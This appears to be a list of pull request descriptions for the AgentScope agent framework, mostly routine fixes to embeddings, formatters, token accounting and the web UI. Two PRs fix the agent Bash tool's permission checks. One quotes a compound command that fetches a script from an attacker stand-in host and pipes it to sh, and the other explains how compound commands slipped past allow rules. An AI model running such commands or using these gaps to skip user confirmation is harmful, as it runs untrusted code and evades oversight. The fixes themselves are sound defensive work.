title: fix(embedding): honor embedding_cache on the Gemini multimodal path
body:
## Why

`GeminiEmbeddingModel.__init__` accepts and documents `embedding_cache` ("Optional embedding cache.") and stores it on the instance, and the text path (`_call_text`) uses it for both retrieve and store. The multimodal path (`_call_multimodal`, serving `gemini-embedding-2`) never touches it: every call hits the paid API, `EmbeddingResponse.source` stays `"api"`, and the cache accounting the rest of the framework relies on is unreachable for multimodal models. Every sibling implements this — DashScope's `_call_multimodal` does retrieve/store, and Gemini's own text path does.

`git log -S "embedding_cache" -- src/agentscope/embedding/_gemini/_model.py` shows only the commit that added text-path caching; the multimodal path has never had it (an original omission, not a regression).

Repro:

```python
cache = FileEmbeddingCache(cache_dir=tmp)
m = GeminiEmbeddingModel(..., model="gemini-embedding-2", dimensions=768, embedding_cache=cache)
a = await m([img_datablock])   # source == "api"
b = await m([img_datablock])   # source == "api" again; cache dir stays empty
```

## What

- Mirror the text path in `_call_multimodal`: build a cache key from the model, the per-call inputs, and the effective config, then retrieve before the API call and store after.
- The identifier serializes each input to a JSON-safe form (`item.model_dump(mode="json", include={"source"})` for `DataBlock` — cache backends hash via `json.dumps`, so raw pydantic objects or `types.Content` would not work). Only the content fields are included: block `id`/`created_at` are unique per object and would make the key unstable across otherwise identical calls.
- Add a regression test: two identical multimodal calls with the same cache return `"api"` then `"cache"`, with the client awaited exactly once. Note the same test with a text+image mixed batch still misses (batching splits them) — this PR only makes each individual batch cacheable, matching the per-batch caching the other providers do.

Tests: `pytest tests/embedding_gemini_test.py` → 12 passed, 10 subtests passed locally.

title: fix(embedding): let per-call dimensions reach the OpenAI embedding API
body:
## Why

`OpenAIEmbeddingModel._call_api` assigns the instance default **after** merging per-call kwargs:

```python
api_kwargs: dict[str, Any] = {
    "input": inputs,
    "model": self.model,
    "encoding_format": "float",
    **kwargs,
}
if self.pass_dimensions:
    api_kwargs["dimensions"] = self.dimensions   # clobbers kwargs["dimensions"]
```

So a caller-supplied `dimensions=` is silently overwritten by `self.dimensions` whenever `pass_dimensions` is True (the default). The request does not error — `dimensions` is a legal `client.embeddings.create()` kwarg — it just embeds at the instance dimensionality instead of the requested one. This is the same bug class already fixed for Gemini in #3404 (per-call `output_dimensionality`) and for DashScope in #3350; OpenAI is the provider those commits did not touch.

Two aggravating details:

- The cache identifier is built from `api_kwargs` *after* the overwrite, so a per-call override does not even get its own cache entry — it reads and writes the entry belonging to the instance dimensions.
- The behavior depends on an unrelated flag: with `pass_dimensions=False` the per-call `dimensions` *does* reach the API, so whether an explicit argument is honored flips with a config meant for endpoints that lack the parameter entirely.

The other three providers all let the per-call value win (`"dimension": self.dimensions, **kwargs` in DashScope, `"dimensions": self.dimensions, **kwargs` in Ollama, `{..., **kwargs}` in Gemini).

Repro:

```python
m = OpenAIEmbeddingModel(credential=..., model="text-embedding-3-small", dimensions=1536)
await m(["hello"], dimensions=256)   # request actually sends dimensions=1536
```

## What

- Build the defaults first, then `api_kwargs.update(kwargs)` so per-call arguments win — matching the DashScope/Ollama/Gemini precedence and the docstring promise ("Extra keyword arguments forwarded to the OpenAI API"). The cache identifier now naturally reflects the effective dimensions.
- Add two regression tests: a per-call `dimensions=` reaches the SDK call; without an override the instance default is still sent.

Tests: `pytest tests/embedding_openai_test.py` → 11 passed locally (new override test verified failing before the fix).

title: fix(formatter): normalize textless system message in xAI multi-agent formatter
body:
## Why

`XAIMultiAgentFormatter.format` forwards `msgs[0].get_text_content()` straight into `xai_sdk.chat.system()`:

```python
if msgs and msgs[0].role == "system":
    text = msgs[0].get_text_content()
    xai_messages.append(system(text))
```

`Msg.get_text_content()` is declared `-> str | None` and returns **`None`** when the message holds no `TextBlock` (empty content, or data-only content). `system()` embeds the value in a protobuf `string` field, so a textless system `Msg` raises `TypeError` and takes the whole `format()` call — and the LLM call it feeds — down instead of degrading.

Every sibling normalizes here, which reads as the intended contract:

- the chat branch of this same file: `"\n".join(b.text for b in text_blocks)` → `""`;
- `_gemini_formatter.py`: `"text": msg.get_text_content() or ""`;
- `_anthropic_formatter.py` / `_ollama_formatter.py`: build `text_parts` and join → `""`.

`XAIMultiAgentFormatter` is the only place in the codebase that passes the raw `str | None` through.

(Note: this is distinct from #3493, which covers the six OpenAI-compatible multi-agent formatters emitting a null system *content dict* — different files, different mechanism, different failure mode.)

Repro:

```python
await XAIMultiAgentFormatter().format(
    [SystemMsg(name="system", content=[]), UserMsg(name="user", content="hi")],
)
# before: system(None) -> TypeError against the real xai_sdk protobuf
# after:  system("")
```

## What

- Normalize with `or ""`, matching the chat branch of the same formatter and the other multi-agent formatters.
- Add a regression test pinning the empty-string system stub for a textless system `Msg` (verified failing before the fix, passing after; the test suite runs against the module-level `xai_sdk` stub).

Tests: `pytest tests/formatter_xai_test.py` → 25 passed locally.

title: fix(formatter): keep text before media in Anthropic multi-agent history
body:
## Why

`AnthropicMultiAgentFormatter._format_agent_message` buffers the current message's text in `agent_text_parts` and only commits it into `accumulated_text` **after** the block loop finishes. When a `DataBlock` is reached mid-message, the flush above it can therefore only see text from *earlier* messages — the text that introduced the image **in the same message** has not been committed yet. The image lands in `conversation_blocks` first, its caption after:

```python
fmt = AnthropicMultiAgentFormatter()
msgs = [
    UserMsg(name="alice", content=[
        TextBlock(text="look at this"),
        DataBlock(source=Base64Source(data=..., media_type="image/png")),
    ]),
    UserMsg(name="bob", content=[TextBlock(text="ok")]),
]
await fmt.format(msgs)
```

Before this PR the collapsed history renders as:

```python
[{"role": "user", "content": [
    {"type": "text",  "text": "<prompt># Conversation History...\n<history>\n"},
    {"type": "image", "source": {...}},                    # BEFORE its caption
    {"type": "text",  "text": "alice: look at this\nbob: ok\n</history>"},
]}]
```

The image is detached from the sentence that introduces it, and the `<history>` opening tag is separated from the history body by an image part.

The flush-inside-the-loop exists precisely to preserve text-before-media order, so this is a partial implementation rather than a design choice — and the sibling `GeminiMultiAgentFormatter._format_agent_message` gets it right by committing text to `accumulated_text` inside the block loop. `MiniMaxMultiAgentFormatter` inherits this method unchanged, so its `video/*` parts are mis-ordered the same way; this PR fixes both.

## What

- In the `DataBlock` branch, commit the message's pending `agent_text_parts` into `accumulated_text` *before* flushing it into `conversation_blocks`, so a media part can never overtake the text of its own message. Text-only histories produce byte-identical output to before (the after-loop commit path is unchanged); the join format `"{name}: {part1} {part2}"` is preserved.
- Add a regression test pinning text → image → text order for a same-message caption plus a second agent's reply.

Tests: `pytest tests/formatter_anthropic_test.py tests/formatter_volcengine_test.py tests/formatter_xai_test.py` → 55 passed locally.

title: fix(tool): require every subcommand to be a filesystem command for ACCEPT_EDITS auto-allow
body:
## Description

In ACCEPT_EDITS / DONT_ASK mode, `Bash.check_permissions` auto-allows filesystem commands (`mkdir`/`touch`/`rm`/...) whose targets all resolve inside a working directory. The command-name check only looked at the **first word of the raw string**, so a compound command such as `touch ./note.txt && curl http://evil.example/p.sh | sh` was auto-allowed in full: every extracted path came from the `touch` segment while the second segment executed arbitrary code without confirmation (unattended in DONT_ASK). The bypass-immune safety checks do not catch this shape (no substitution, no dangerous pattern, no sensitive path).

This PR splits the command with the existing AST parser and requires **every** subcommand's base name to be in the filesystem-command set before auto-allowing. Compound commands with a non-filesystem segment now fall through to the normal rule/ASK flow. Single-command behavior is unchanged.

## Related Issue

Fixes #3514

## Motivation and Context

- Restores the documented invariant of step 6: it auto-allows *filesystem commands*, not "anything whose first word is a filesystem command".
- Mirrors the per-subcommand principle already used by `is_read_only_command` and by PR #3513 for allow-rule matching (independent code path and modes, hence a separate PR).
- Conservative direction: commands that no longer qualify fall through to ASK instead of being silently allowed.

## How Has This Been Tested?

- Added `test_accept_edits_compound_command_not_auto_allowed` and `test_accept_edits_all_filesystem_compound_auto_allowed` in `tests/builtin_bash_test.py`.
- Verified directly: `touch x && curl ... | sh` → PASSTHROUGH (was ALLOW); `mkdir ./sub && touch ./sub/a.txt` → ALLOW; `cp ./a ./b` → ALLOW; `rm -rf ./tmp && echo done` → ASK (bypass-immune check unchanged).
- `tests/builtin_bash_test.py tests/permission_engine_test.py`: 17 passed (remaining skips are the Windows-only execution skips).

title: fix(tool): match Bash permission rules against every subcommand of a compound command
body:
## Description

`BashTool.match_rule` applied prefix / wildcard / substring patterns to the raw command string. For a compound command the whole string starts with the first subcommand's text, so an ALLOW rule `git:*` — the exact format `generate_suggestions` proposes to users — also matched `git status && <arbitrary second command>`. In DEFAULT mode, a second command that avoids the short bypass-immune dangerous-pattern list (no `$(...)`, no `rm -rf`, no sensitive config paths) was then silently auto-allowed, even though the user only allowed git commands.

This PR splits the command with the existing AST-based parser (`split_compound_command`) and requires the pattern to match **every** subcommand. Single-command matching is unchanged. A new `split_into_subcommands` convenience wrapper on `BashParser` parses the command and falls back to `[command]` when nothing can be extracted.

## Related Issue

Fixes #3512

## Motivation and Context

- `is_read_only_command()` already evaluates compound commands per-subcommand via the same parser; `match_rule()` now follows the same principle.
- The suggested-rule UX (`git commit:*` etc.) makes these rules very common, so the raw-string match turned any accepted suggestion into a broad auto-allow.
- Conservative direction: a compound command that no longer fully matches now falls through to the normal ASK flow instead of being silently allowed.

## How Has This Been Tested?

- Added regression tests in `tests/builtin_bash_test.py` (`test_match_rule_compound_command`, `test_match_rule_compound_command_all_match`): prefix / substring / wildcard rules no longer match compound commands with a non-matching second command (including pipes), and still match when every subcommand matches.

title: feat(model): only send think option to Ollama when explicitly configured
body:
## Description

`OllamaChatModel` unconditionally sent `think` in every chat request. Since `Parameters.thinking_enable` is a plain `bool` defaulting to `False`, every request was sent with `think: false` — even when the user never configured anything about thinking. This PR makes `thinking_enable` tri-state (`bool | None`, default `None`) and forwards `think` only when explicitly set:

```python
if self.parameters.thinking_enable is not None:
    kwargs["think"] = self.parameters.thinking_enable
```

Explicit `thinking_enable=False` still sends `think: false`, so users who relied on the old explicit behavior are unaffected; only the never-configured default changes.

- Matches the pattern already used by the Volcengine provider (`src/agentscope/model/_volcengine/_model.py`): tri-state `bool | None` forwarded only when not `None`.

title: fix(webui): include full calendar days in schedule date filter
body:
## AgentScope Version

`2.0.11dev`

## Description

Fixes #3503.

### Background & Problem
On the Web UI's **Schedule → List** page, filtering schedules by selecting a single day (e.g., 2026-10-27 to 2026-10-27) or a date range excluded valid occurrences that happen on those days:
1. The start and end dates from the date picker represent midnight (`00:00:00.000`) of the respective days.
2. `CronExpressionParser.parse` was called directly with `rangeStart` and `rangeEnd`. Because `cron-parser` searches forward strictly after `currentDate`, occurrences scheduled at midnight on the start date (such as `0 0 27 10 *`) were skipped.
3. Setting `endDate: rangeEnd` where `rangeEnd` is `00:00:00.000` caused all occurrences scheduled later on that day (such as daily runs at `0 9 * * *`) to be deemed outside the range (`ts > endDate`). Consequently, selecting a single day returned an empty list.

### Solution
In `examples/web_ui/frontend/src/pages/schedule/list-tab-page.tsx`:
- Set `currentDate` to `new Date(startOfDay(rangeStart).getTime() - 1)` (1 millisecond before midnight of the starting day) so that occurrences right at `00:00:00` are evaluated.
- Set `endDate` to `endOfDay(rangeEnd)` so that the entire calendar day up through `23:59:59.999` is included.
- Existing activation boundaries (`data.started_at` and `data.ended_at`) remain strictly enforced.

### How to Test
1. Automated verification: Tested against `cron-parser` with daily occurrences (`0 9 * * *`), midnight occurrences (`0 0 27 10 *`), outside-date occurrences (`0 9 28 10 *`), and activation bounds (`started_at` / `ended_at`).
2. Web UI checks:
   - `pnpm format:check` in `examples/web_ui` passed (Prettier & ESLint).
   - `pnpm build` in `examples/web_ui` built frontend and backend without error.

title: fix(formatter): never emit a null system content for OpenAI-compatible providers
body:
Fixes #3492

`SystemMsg("sys", [])` is a valid message, but `Msg.get_text_content()` returns `None` when it has no `TextBlock`. The six OpenAI-compatible multi-agent formatters pass that value straight into the system turn, so the first request in a multi-agent conversation sends `{"role": "system", "content": None}` and the endpoint rejects it with a 400.

This applies to `OpenAIMultiAgentFormatter`, `OpenAIResponseMultiAgentFormatter`, `DashScopeMultiAgentFormatter`, `DeepSeekMultiAgentFormatter`, `MoonshotMultiAgentFormatter` and `VolcengineMultiAgentFormatter`. The Gemini multi-agent formatter already coerces the same value (#2950); the Anthropic, MiniMax and Ollama formatters build their system payload from strings and cannot hit this path.

The change is six one-line edits: `msg.get_text_content()` becomes `msg.get_text_content() or ""`. A real system prompt is unchanged.

The regression test formats `[SystemMsg("sys", []), UserMsg("u", "hi")]` with each affected formatter and asserts that the system turn carries a string. It also covers the sibling formatters and a non-empty system prompt.

## Test plan

- `python -m pytest -q tests/formatter_system_message_test.py` (3 passed, 10 subtests passed)

title: fix(realtime): retire unbound local user turns when the transport dies
body:
Fixes #3490

## Summary

The `reply_stream` teardown for a dead transport ended pending user turns but left **unbound** (item-id-less, local-VAD) ones in `_pending_user_turns`. `_end_user_turn` intentionally keeps ended turns addressable for late transcripts, so a local turn whose audio never reached the provider (no transcript can ever arrive) survived as a ghost — first in insertion order. After the caller attaches a new transport to the still-connected model session, `_find_user_turn`'s unbound fallback attributed the next run's first transcript to the dead reply: text events under an already-ended reply id, a duplicate `UserMsg` id in context, and the fresh turn left open with no `ReplyEnd`.

The teardown now calls the new `_retire_unbound_user_turns`, which ends every pending turn and drops only the identity-less ones. **Bound** turns are kept exactly as before, so a transcript settling after the transport died still lands in the reply the caller already saw end (pinned by the existing `test_transcription_after_transport_end_keeps_turn`).

## Verification

- New `tests/realtime_transport_turn_reset_test.py::test_transport_end_retires_unbound_local_turns`:
  - fails on current main — the transcript's text/end land on the run-1 ghost's id and the run-2 turn leaks open
  - passes with this change — the transcript attaches to the new turn and context holds one `UserMsg` under its id
- No behavior change for bound turns: the existing late-transcript test and the rest of the realtime suites pass unchanged (75 passed + 22 subtests across `realtime_agent_test`, `realtime_reconnect_test`, `realtime_aggregator_test`, `realtime_service_test`, `realtime_dashscope_test`)

## Risk

Low — only identity-less ghosts are dropped, only at transport teardown; every path a late transcript can legitimately use (item-id match) is untouched.

title: fix(tool): keep resolvable annotations when one hint fails
body:
## AgentScope Version

2.0.11dev (main)

## Description

Fixes #3446

**Background.** `_resolve_type_hints()` in `src/agentscope/tool/_utils.py` calls `typing.get_type_hints()` on the whole function. If any single annotation can't be resolved at runtime (typically `_agent_state: AgentState | None` or the return type, when `AgentState` is imported only under `if TYPE_CHECKING:`), the `except Exception` branch sets `type_hints = {}`. Every other parameter then keeps its raw string annotation and the generated pydantic model fails with `PydanticUserError: ... is not fully defined`.

**Change.** When `get_type_hints()` fails, fall back to the existing `_resolve_partial_type_hints` helper (widened from `partial` to any `Callable`) which resolves each annotation on its own with the function's `__globals__`. Annotations that still can't be resolved are skipped, so they keep the old behaviour. `globalns` is now computed before the `try` so the fallback can use it.

**Test.** Added `test_type_checking_only_annotation_keeps_other_hints` in `tests/tool_lazy_annotations_test.py`. It fails on current main with the error above and passes with this change. `tool_lazy_annotations_test.py`, `toolkit_test.py` and `tool_middleware_test.py` pass.

title: fix(channel): degrade Discord chat kind/name lookups to contract defaults
body:
## What

`DiscordChannel.chat_kind()` and `chat_name()` now catch a failed channel fetch and return the `ChannelBase` contract defaults (`None` / `""`) instead of propagating the exception, matching how the Feishu and DingTalk channels degrade.

Fixes #3482

## Why

`_channel()` resolves an id as `get_channel(id) or await fetch_channel(id)`. For a well-formed id that cannot be fetched — the channel was deleted between the inbound message and session setup, or the bot lost access to it — `fetch_channel` raises (`discord.Forbidden` / `NotFound`), and both lookups blew up unguarded inside the services:

- `src/agentscope/app/_service/_chat.py` — `await channel.chat_kind(...)` when equipping channel tools and `channel.chat_name(...)` when naming the session
- `src/agentscope/app/_service/_realtime.py` — the same two lookups when a realtime session binds its channel

Malformed ids already returned the defaults (the `int()` failure path); only the fetch-failure path was unguarded. Details and a minimal reproduction are in the linked issue.

## How

`try/except` around the `_channel()` call in both methods — lookups that fail log at debug and return `None` / `""`. Nothing else changes: `send_response` already treats an unresolvable target as a no-op, and the lookup helper itself is untouched so other callers keep their current behavior.

## Tests

`tests/channel_discord_chat_lookup_test.py` — 4 regression tests with faked clients: a failing fetch returns the defaults, malformed/empty ids still do, a resolved channel classifies as GROUP with its name, and a DM-style channel classifies PRIVATE. All pass locally, along with `black --line-length=79`, `flake8`, `pylint` (repo args, 10.00/10) and `mypy` (repo args). The module skips cleanly without the `channel` extra (`pytest.importorskip("discord")`).

title: fix(tool): keep resolvable annotations when one hint fails
body:
## Summary

A tool module that uses postponed annotations and imports a parameter type only under `if TYPE_CHECKING:` (typically the injected `_agent_state: AgentState | None`) made `_resolve_type_hints()` call `typing.get_type_hints()` on the whole function. That call resolves every annotation, including the skipped `_agent_state` and the return type, and its failure dropped **all** hints, so the generated pydantic model could not be built and `FunctionTool` raised `PydanticUserError: ... is not fully defined`.

When `get_type_hints()` fails, the remaining annotations are now resolved individually with the function's `__globals__`, and only the annotations that still cannot be resolved are skipped. This matches the fallback `_resolve_partial_type_hints()` already used for `functools.partial` wrappers.

Closes #3446

## Test

`tests/tool_lazy_annotations_test.py::LazyAnnotationsTest::test_unresolvable_annotation_does_not_discard_the_others`

```bash
pytest tests/tool_lazy_annotations_test.py   # 14 passed
```

title: fix(model): count cached prompt tokens in anthropic input_tokens
body:
## AgentScope Version

main @ bdad647d

## Description

Fixes #3476.

**Problem.** `ChatUsage.input_tokens` already includes the cached prompt tokens for the OpenAI-compatible, DeepSeek and Gemini models, because it is filled from `prompt_tokens` / `prompt_token_count`. `AnthropicChatModel` instead fills it from Anthropic's `usage.input_tokens`, which leaves out the cache reads and writes. With prompt caching on, a Claude call then reports only the uncached tail of the prompt. `ReplyBudgetControlMiddleware`, `Msg.usage`, the TUI and console readouts and the `gen_ai.usage.input_tokens` span attribute all undercount it, and a given `token_budget` allows far more real tokens on Claude than on other providers.

**Change.**
- Add a `_total_input_tokens` helper that returns `input_tokens + cache_creation_input_tokens + cache_read_input_tokens`. Null counters are read as 0.
- Use the helper in the non-streaming path and in the streaming `message_start` path.
- `cache_input_tokens` and `cache_creation_input_tokens` are unchanged and stay as breakdowns of `input_tokens`.
- Spell out that meaning in the `ChatUsage.input_tokens` docstring.

**Overlap.** #3428 (for #3426) also edits the streaming usage: it takes the cumulative counts from `message_delta`. Whichever PR lands second should feed `message_delta`'s usage through the same helper. I'm happy to rebase.

**How to test.**
```
pytest tests/model_anthropic_test.py
```

`test_cached_tokens_counted_in_input_tokens` covers both paths with a real `anthropic.types.Message` (10 uncached + 200 cache-write + 3000 cache-read tokens). title: fix(embedding): allow per-call dimensions override in OpenAIEmbeddingModel
body:
## PR Title Format

`fix(embedding): allow per-call dimensions override in OpenAIEmbeddingModel`

## AgentScope Version

`2.0.11dev`

## Description

Fixes #3467

### Background & Problem
`OpenAIEmbeddingModel._call_api` silently discarded per-call `dimensions` arguments passed to `__call__(..., dimensions=...)`. The base class documents `**kwargs` on `__call__` as forwarding to the underlying API provider. However, `_call_api` built the payload as:
```python
api_kwargs = {
    "input": inputs,
    "model": self.model,
    "encoding_format": "float",
    **kwargs,
}
if self.pass_dimensions:
    api_kwargs["dimensions"] = self.dimensions  # overwrites per-call dimensions
```
Because the assignment came after the `**kwargs` unpacking, the instance's default `dimensions` always overwrote any per-call value when `pass_dimensions=True` (the default). In contrast, sibling embedding models (`GeminiEmbeddingModel`, `OllamaEmbeddingModel`, and `DashScopeEmbeddingModel`) treat the instance configuration as a fallback default that per-call kwargs can override.

### Proposed Changes
- In `OpenAIEmbeddingModel._call_api`, include `{"dimensions": self.dimensions}` before unpacking `**kwargs` when `self.pass_dimensions` is enabled.
- Add regression unit tests in `tests/embedding_openai_test.py` verifying that:
  1. A per-call `dimensions` kwarg correctly overrides the instance default.
  2. When no per-call `dimensions` is supplied, the instance default is forwarded as expected.

title: fix(embedding): let a per-call dimensions override the OpenAI default
body:
Fixes #3467

## Summary

`OpenAIEmbeddingModel` silently overwrote per-call `dimensions` with the instance value when `pass_dimensions=True`. For example, an instance configured with `dimensions=1536` still requested 1536 dimensions when called with `dimensions=512`.

Use `api_kwargs.setdefault("dimensions", self.dimensions)` so an explicit per-call value wins and the instance value remains the default. With `pass_dimensions=False`, the instance default is omitted and explicit per-call values are still forwarded.

This preserves the parameter insertion order for unchanged requests, keeping existing `FileEmbeddingCache` entries usable even when callers supply extra arguments such as `user`. Cache identifiers include the effective dimensions sent to the API.

## Validation

Tests are in the existing `tests/embedding_openai_test.py`:

- `test_dimensions`: four `subTest` cases using `AsyncMock`, covering both values of `pass_dimensions`, with and without a per-call override; asserts the complete SDK arguments and response, and that the instance dimensions remain unchanged.

title: fix(pipeline): scope the goal pipeline retry budget to one output generation
body:
## What does this PR do?

Fixes #3462

The executor/verifier retry counters introduced in #3078 are instance state (so a HITL resume keeps its budget) but are only reset on a fresh run — so they also accumulate across the pipeline's own goal-loop iterations. An executor needing one nudge per iteration exhausts `max_retries` without any single generation ever exceeding it, and the run aborts mid-goal with the factually wrong "failed to generate a valid execution report after N retries" (valid reports were generated in between). Default settings (`max_retries=3`, `max_iters=10`) kill any goal needing one nudge in 4+ iterations.

### Change

Reset each participant's counter when it produces a valid output: the executor's report clears `_executor_retries`; a valid verifier verdict (pass/fail/impossible) clears `_verifier_retries`. A parked (HITL) reply still keeps its budget — only success clears it, preserving #3078's resume semantics.

## Checklist

- [x] An issue has been created for this PR (#3462).
- [x] I have added regression tests (`tests/pipeline_goal_retry_test.py`, two cases — executor-side and verifier-side leakage — both red on `main`, green with the fix).

title: fix(tool): group streamed data blocks by id and type in append_chunk
body:
## What does this PR do?

Fixes #3456

`ToolChunk.content` documents that the blocks of one multimodal data share a block id so the agent can group them. `ToolResponse.append_chunk` keyed its accumulation map by the bare `id`, so once a TextBlock had taken an id, every later same-id DataBlock hit the "different block types" branch — appended under a fresh random id and never registered, splitting the binary payload across multiple independently-padded base64 blocks (corrupted for consumers decoding per block).

The map is now keyed by `(id, type)`: a text stream and a data stream sharing one label accumulate independently, exactly like the documented grouping. The existing same-type merge behavior (including the byte-level base64 merge from #1901) is unchanged.

title: fix(agent): fit truncated tool text to the counted token limit
body:
Fixes #3438

`_split_tool_result_for_compression` sizes the retained prefix from the block's average token density (`src/agentscope/agent/_agent.py:3131`). A prefix whose script mix differs from that average is denser than the estimate, so the retained text could exceed `ContextConfig.tool_result_limit` under the same counter used to decide the truncation. With `limit=100`, `"汉" * 400 + "a" * 1200` retained an estimated 200 tokens.

After the proportional prefix is computed, `_fit_text_prefix_to_token_limit` (`_agent.py:3213`) rebuilds the exact candidate output (merging into the trailing text block when there is one), counts it with the same `model.count_tokens`, and binary-searches the prefix length when the proportional candidate overshoots. It only pays the extra counts on an over-budget candidate; a split that already fits is confirmed with one count.

Verification:

- issue repro: `Chinese first retained=100` (main: 200), `ASCII control=100`, `ASCII first=67`
- `pytest tests/compress_tool_result_test.py -q`: 10 passed; the new mixed-script case fails on main with `AssertionError: 199 not less than or equal to 100`
- `pre-commit run --files` passes: black 23.3.0, flake8 6.1.0, mypy, pylint
- reserved and offloaded text still reconstruct the original payload, and the input block is unchanged

The `<TRUNCATED>` reminder appended after the split (`_agent.py:2644`) still sits outside the limit, as before; counting it would be a separate policy change.

title: fix(message): ignore custom events without reply_id
body:
## AgentScope Version

2.0.10 (patch prepared against `main`)

## Description

Fixes #3432.

`CustomEvent` had no `reply_id`, while `Msg.append_event` read `event.reply_id`
unconditionally to drop events from other replies. Replaying or folding a
stream that contains custom events therefore raised
`AttributeError: 'CustomEvent' object has no attribute 'reply_id'` and marked
the reply as failed.

**Changes**

- `CustomEvent` gains an optional `reply_id: str | None = None`, documented as
  "the reply this event belongs to, if any";
- `Msg.append_event` now uses `getattr(event, "reply_id", None)` and only skips
  events whose `reply_id` is set and differs from `self.id`. Events without a
  `reply_id` (e.g. `CustomEvent`) are ignored instead of raising.

Both changes are backward compatible: existing `CustomEvent(name=..., value=...)`
constructions keep working, and `append_event` semantics for every other event
type are unchanged.

**Tests**

`tests/event_to_message_test.py` adds two cases: a `CustomEvent` without
`reply_id` is ignored, and one targeting another reply is skipped.

title: fix(model): take the cumulative input and cache usage of the anthropic message_delta
body:
Fixes #3426


## AgentScope Version

2.0.11dev

## Description

`AnthropicChatModel` took the input and cache token counts of a streamed response only from `message_start`. The usage of a `message_delta` is cumulative: with server tools (web search, ...) its `input_tokens` and cache counts grow past the `message_start` values, so streamed responses under-reported them.

The `message_delta` handler now also compares `input_tokens`, `cache_creation_input_tokens` and `cache_read_input_tokens` and keeps the larger value; a field the delta leaves out keeps its `message_start` value, and non-integer values are ignored.

Tests (`tests/model_anthropic_test.py`): a stream whose `message_start` has 120 input tokens and whose `message_delta` has 5120 input, 32 cache creation and 64 cache read tokens reports those values on the last response (it fails on `main` with `120 != 5120`), and a `message_delta` without input counts keeps the `message_start` ones. `tests/model_anthropic_test.py` passes (31 tests). title: feat(classifier): let a per-call model override reach the Jev system_one call
body:
## Summary

`JevClassifierModel.__call__` passed `model=self.model` next to `**kwargs`, so a
caller following the documented per-call options — `**kwargs` is described as
"Per-call TypeSafe options" at `src/agentscope/classifier/_jev/_model.py:137-139`
— crashes with `TypeError` before the request is built:

```
model: TypeError -> ... got multiple values for keyword argument 'model'
```

`AsyncTypeSafeClient.system_one` declares `model: str | None = None` as a
keyword-only override, so the call was legal to ask for; it just could not be
made through this wrapper.

The instance defaults are now merged under the caller's kwargs in a single dict,
so a per-call option wins and each name reaches the SDK once. This is the same
shape #3391 introduced for `OpenAIClassifierModel`, whose `__call__` had the
identical defect and which is now merged on `main`; this issue was already named
in that report's Impact section (#3390) and is now reproducible and verifiable
because `typesafe-sdk` installs from the repo's own `classifier-jev` extra.

Fixes #3423

## Root cause

Argument binding, not provider behaviour: the wrapper splats `**kwargs` into a
call that already names `model`. No network, API key, or TypeSafe server is
involved — the crash happens on the way *into* `client.system_one`, which is why
the reproduction mocks the client the way `tests/classifier_jev_test.py` already
does.

Only `model` collides today: `state` and `questions` are bound by `__call__`'s
own parameters, and `extra_headers`, `extra_body`, `timeout`, `retry` and
`assets` were confirmed to pass through untouched. All three defaults go into the
dict anyway so the rule matches the sibling and a future keyword added here
cannot reintroduce the crash.

## Behaviour before → after

Reproduction from the issue, run against `origin/main` (`__VERSION__` = `2.0.11dev`) and against this branch:

```
# before (base ed357feb78a45ff02df155bb5610eab9bf543832, pristine)
model: TypeError -> <AsyncMock name='mock.system_one' id='...'> got multiple values for keyword argument 'model'
extra_headers: ok, sdk got model='jev-latest' extra_headers={'x-a': '1'}
extra_body: ok, sdk got model='jev-latest' extra_body={'trace': True}
timeout: ok, sdk got model='jev-latest' timeout=1.0
retry: ok, sdk got model='jev-latest' retry='policy'
assets: ok, sdk got model='jev-latest' assets={}

# after
model: ok, sdk got model='jev-1.5' model='jev-1.5'
extra_headers: ok, sdk got model='jev-latest' extra_headers={'x-a': '1'}
extra_body: ok, sdk got model='jev-latest' extra_body={'trace': True}
timeout: ok, sdk got model='jev-latest' timeout=1.0
retry: ok, sdk got model='jev-latest' retry='policy'
assets: ok, sdk got model='jev-latest' assets={}
```

## Tests

`tests/classifier_jev_test.py` gains `JevClassifierModelPerCallOptionTest` (a new
class, following the `BashToolMatchRuleTest` precedent in
`tests/builtin_bash_test.py`, rather than growing the existing one):

- `test_per_call_model_replaces_the_default` asserts the whole kwargs dict
  handed to `system_one`, so `model` is forwarded exactly once with the caller's
  value and `state` / `questions` / `extra_body` are unchanged.
- `test_per_call_model_is_not_remembered` asserts the override applies to one
  call only and the next call goes back to the instance default.

Neither the crash nor the intended behaviour was pinned by an existing test:
`tests/classifier_jev_test.py:128` and `:190` only assert the forwarded `model`
equals the instance default when no override is passed, and both still pass.

`tests/classifier_jev_test.py`, run with `PYTHONPATH` pointed at the tree under test (the checkout is editable-installed, so the env must pin which tree loads — `agentscope.__file__` is printed before each run):

| tree | command | result |
| --- | --- | --- |
| pristine `ed357feb` + these tests | `pytest tests/classifier_jev_test.py` | `2 failed, 3 passed in 1.51s` |
| this branch `21945f2b` | same | `5 passed in 1.40s` |
| this branch, all classifier tests | `pytest tests/classifier_jev_test.py tests/classifier_openai_test.py tests/classifier_test.py` | `17 passed, 4 subtests passed in 1.16s` |

Full suite, `NO_PROXY=127.0.0.1,localhost PYTHONPATH=<tree>/src pytest tests`:
- pristine `ed357feb`: `2875 passed, 125 skipped, 683 subtests passed in 218.83s`, exit 0
- branch `21945f2b`: `2877 passed, 125 skipped, 683 subtests passed in 221.40s`, exit 0

The +2 is exactly the two new cases; no existing test changed state. Note `tests/classifier_jev_test.py` now *runs* rather than being skipped, because `typesafe-sdk` is installed from the repo's own `classifier-jev` extra — the same state CI is in.

## Notes on scope and collisions

- One file, one function, plus its tests; the response handling and the client
  constructor are untouched, so `tests/classifier_jev_test.py`'s existing
  assertions on `AsyncTypeSafeClient` kwargs still hold.
- Checked against all 286 open PRs' changed-file lists: **no open PR touches
  `src/agentscope/classifier/**` or `tests/classifier_jev_test.py`**, so this

- `middleware/_model_router.py:118-121` is the only in-repo caller and passes no

- These two tests only run when `typesafe-sdk` is importable
  (`tests/classifier_jev_test.py:21`). `.[dev]` pulls it through
  `full → classifiers → classifier-jev`, so CI runs them; the file's existing
  three tests already rely on that.

title: fix(web-ui): reset document panel when switching knowledge bases
body:
## AgentScope Version

`2.0.11dev`, based on `main` at `ed357feb78a45ff02df155bb5610eab9bf543832`.

## Description

Fixes #3418.

The document panel previously retained its hook state and detail/delete targets when its knowledge-base ID changed. The request-sequence guard prevents late responses from overwriting a newer request, but does not clear rows that have already been stored; pending and failed requests could therefore show the previous knowledge base's documents under the newly selected base.

Key `KnowledgeDocumentsPanel` by knowledge-base ID so a switch gives it a fresh lifecycle. Same-base refetches keep the same instance, and the upload provider remains above this boundary. No backend/API changes, new dependencies, lockfile changes, or new error/retry UI.

